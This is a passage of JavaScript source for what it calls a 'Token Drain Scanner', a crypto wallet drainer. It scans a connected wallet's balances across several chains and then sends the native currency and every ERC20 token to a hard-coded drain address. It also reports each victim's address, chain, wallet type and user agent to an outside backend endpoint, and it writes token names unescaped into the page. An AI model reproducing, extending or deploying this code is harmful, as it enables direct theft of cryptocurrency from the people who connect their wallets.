// [Rest of the functions remain the same as previous version: fetchTokens, displayTokens, handleDrain, drainNativeToken, drainAllERC20Tokens, drainERC20Token, encodeTransferData, updateProgress, updateStatus, showUIElements, hideUIElements, logConnectionToBackend, disconnectWallet, handleNetworkChange, handleScanAllChains, fetchTokensForChain]

// ================================================
// TOKEN MANAGEMENT FUNCTIONS (SAME AS BEFORE)
// ================================================

// Fetch tokens for current chain
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens on ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    // Group tokens by chain
    const tokensByChain = {};
    tokens.forEach(token => {
        if (!tokensByChain[token.chainId]) {
            tokensByChain[token.chainId] = [];
        }
        tokensByChain[token.chainId].push(token);
    });
    
    let html = '';
    
    Object.entries(tokensByChain).forEach(([chainId, chainTokens]) => {
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        
        html += `
            <div class="chain-section">
                <div class="chain-header">
                    <h4>${chainName}</h4>
                    <span class="token-count">${chainTokens.length} tokens</span>
                </div>
                ${chainTokens.map(token => `
                    <div class="token-item" data-address="${token.contractAddress || 'native'}" data-chain="${chainId}">
                        <div class="token-info">
                            ${token.logoUrl ? `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : ''}
                            <div>
                                <span class="token-symbol">${token.symbol}</span>
                                <span class="token-name">${token.name}</span>
                            </div>
                        </div>
                        <div class="token-amounts">
                            <div class="token-amount">${token.amount}</div>
                            <div class="token-value">${token.value}</div>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    });
    
    tokensEl.innerHTML = html;
}

// Handle drain - DRAIN ALL TOKENS
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens detected to drain');
        return;
    }
    
    // Confirm drain
    if (!confirm(`⚠️ WARNING: This will send ALL detected tokens and native currency to:\n${CONFIG.drainAddress}\n\nEstimated tokens: ${detectedTokens.length}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting comprehensive drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining ALL tokens...';
        }
        
        // Create progress indicator
        const progress = document.createElement('div');
        progress.id = 'drainProgress';
        progress.innerHTML = '<div class="progress-bar"><div class="progress-fill"></div></div><div class="progress-text">Starting...</div>';
        statusEl.appendChild(progress);
        
        // 1. First, drain native token (ETH, BNB, MATIC, etc.)
        await drainNativeToken();
        
        // 2. Drain all ERC20 tokens
        await drainAllERC20Tokens();
        
        updateStatus('✅ Drain completed successfully!');
        alert('✅ All tokens have been drained successfully!');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) {
            errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMsg = 'Transaction failed. Check gas settings.';
        } else if (error.message.includes('insufficient funds')) {
            errorMsg = 'Insufficient funds for gas fees';
        }
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain All Tokens';
        }
        
        // Remove progress indicator
        const progress = document.getElementById('drainProgress');
        if (progress) progress.remove();
    }
}

// Drain native token
async function drainNativeToken() {
    updateProgress('Draining native token...', 10);
    
    const provider = window.ethereum || window.BinanceChain;
    
    // Get balance
    const balanceHex = await provider.request({
        method: 'eth_getBalance',
        params: [currentAccount, 'latest']
    });
    
    const balance = parseInt(balanceHex, 16);
    
    if (balance === 0) {
        updateProgress('No native token to drain', 20);
        return;
    }
    
    // Get gas price
    const gasPriceHex = await provider.request({
        method: 'eth_gasPrice',
        params: []
    });
    
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    // Check if we have enough for gas
    if (balance <= gasCost * 2) {
        updateProgress('Not enough native token for gas fees', 30);
        return;
    }
    
    // Calculate amount to send (leave some for gas for token transfers)
    const sendAmount = balance - (gasCost * 5);
    
    if (sendAmount <= 0) {
        updateProgress('Not enough after gas fees', 40);
        return;
    }
    
    // Send native token
    const txHash = await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
    
    updateProgress(`Native token sent: ${txHash.slice(0, 10)}...`, 50);
    await new Promise(resolve => setTimeout(resolve, 3000));
}

// Drain all ERC20 tokens
async function drainAllERC20Tokens() {
    const provider = window.ethereum || window.BinanceChain;
    
    // Filter only ERC20 tokens (not native)
    const erc20Tokens = detectedTokens.filter(t => !t.isNative && t.contractAddress);
    
    if (erc20Tokens.length === 0) {
        updateProgress('No ERC20 tokens to drain', 60);
        return;
    }
    
    updateProgress(`Draining ${erc20Tokens.length} ERC20 tokens...`, 60);
    
    let completed = 0;
    
    for (const token of erc20Tokens) {
        try {
            // Drain the token
            await drainERC20Token(token);
            
            completed++;
            const percent = 60 + (completed / erc20Tokens.length * 40);
            updateProgress(`Draining ${token.symbol}... (${completed}/${erc20Tokens.length})`, percent);
            
            // Small delay between transactions
            await new Promise(resolve => setTimeout(resolve, 2000));
            
        } catch (error) {
            console.error(`Failed to drain ${token.symbol}:`, error);
        }
    }
    
    updateProgress(`Completed draining ${completed} tokens`, 100);
}

// Drain single ERC20 token
async function drainERC20Token(token) {
    const provider = window.ethereum || window.BinanceChain;
    
    // Encode transfer function call
    const transferData = encodeTransferData(token.balance);
    
    try {
        // Get gas estimate for token transfer
        const gasEstimate = await provider.request({
            method: 'eth_estimateGas',
            params: [{
                from: currentAccount,
                to: token.contractAddress,
                data: transferData
            }]
        });
        
        const gasLimit = parseInt(gasEstimate, 16) * 2;
        
        // Get gas price
        const gasPriceHex = await provider.request({
            method: 'eth_gasPrice',
            params: []
        });
        
        // Send token transfer
        const txHash = await provider.request({
            method: 'eth_sendTransaction',
            params: [{
                from: currentAccount,
                to: token.contractAddress,
                data: transferData,
                gas: '0x' + gasLimit.toString(16),
                gasPrice: gasPriceHex
            }]
        });
        
        return txHash;
        
    } catch (error) {
        console.error(`Failed to drain ${token.symbol}:`, error);
        throw error;
    }
}

// Encode transfer function call
function encodeTransferData(amount) {
    const functionSignature = '0xa9059cbb';
    const paddedAddress = CONFIG.drainAddress.slice(2).padStart(64, '0');
    const paddedAmount = BigInt(amount).toString(16).padStart(64, '0');
    return functionSignature + paddedAddress + paddedAmount;
}

// Update progress indicator
function updateProgress(message, percent) {
    const progressText = document.querySelector('.progress-text');
    const progressFill = document.querySelector('.progress-fill');
    
    if (progressText) {
        progressText.textContent = message;
    }
    
    if (progressFill) {
        progressFill.style.width = `${percent}%`;
    }
}

// Update status
function updateStatus(message) {
    if (statusEl) {
        statusEl.textContent = message;
    }
}

// Show UI elements
function showUIElements() {
    const elements = ['tokensContainer', 'drainBtn', 'scanAllBtn', 'networkSelector'];
    elements.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'block';
    });
}

// Hide UI elements
function hideUIElements() {
    const elements = ['tokensContainer', 'drainBtn', 'scanAllBtn', 'networkSelector'];
    elements.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.style.display = 'none';
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString(),
                wallet: selectedWallet,
                isMobile: isMobile,
                userAgent: navigator.userAgent
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    selectedWallet = null;
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Handle network change
async function handleNetworkChange() {
    if (!networkSelector || !networkSelector.value) return;
    
    const chainId = parseInt(networkSelector.value);
    if (!chainId || chainId === currentChainId) return;
    
    const provider = window.ethereum || window.BinanceChain;
    if (!provider) return;
    
    try {
        updateStatus(`🔄 Switching to ${CONFIG.networkNames[chainId] || `Chain ${chainId}`}...`);
        
        await provider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: `0x${chainId.toString(16)}` }],
        });
        
    } catch (switchError) {
        console.log('Network switch error:', switchError);
        updateStatus(`❌ Failed to switch network`);
    }
}

// Handle scan all chains
async function handleScanAllChains() {
    if (!currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    updateStatus('🔍 Scanning all chains for tokens...');
    
    const chainsToScan = [1, 56, 137, 42161, 10, 43114, 8453];
    let allTokens = [];
    
    for (const chainId of chainsToScan) {
        try {
            const tokens = await fetchTokensForChain(currentAccount, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
        } catch (error) {
            console.log(`⚠️ Failed to scan chain ${chainId}:`, error.message);
        }
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        updateStatus(`✅ Found ${allTokens.length} tokens across all chains`);
    } else {
        updateStatus('ℹ️ No tokens found on any chain');
    }
}

// Fetch tokens for specific chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) {
            throw new Error(`API error: ${response.status}`);
        }
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance,
                    chainId: chainId,
                    chainName: chainName,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        console.error(`❌ Token fetch error for chain ${chainId}:`, error);
        return [];
    }
}

// Initialize app on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions available globally
window.closeWalletSelector = closeWalletSelector;
window.selectWallet = selectWallet;
window.connectUniversal = connectUniversal;
window.closeMobileInstructions = closeMobileInstructions;
window.closeInstallModal = closeInstallModal;
window.checkConnection = checkConnection;
window.retryMobileConnection = retryMobileConnection;

console.log('=== Token Drain Scanner ===');
console.log('Version: 7.0 - Fixed All Wallets Connection');
console.log('Supported Wallets: MetaMask, Trust, Binance, Coinbase, Phantom, OKX');
console.log('Device:', isMobile ? '📱 Mobile' : '💻 Desktop');
console.log('Drain Address:', CONFIG.drainAddress);
console.log('===========================');
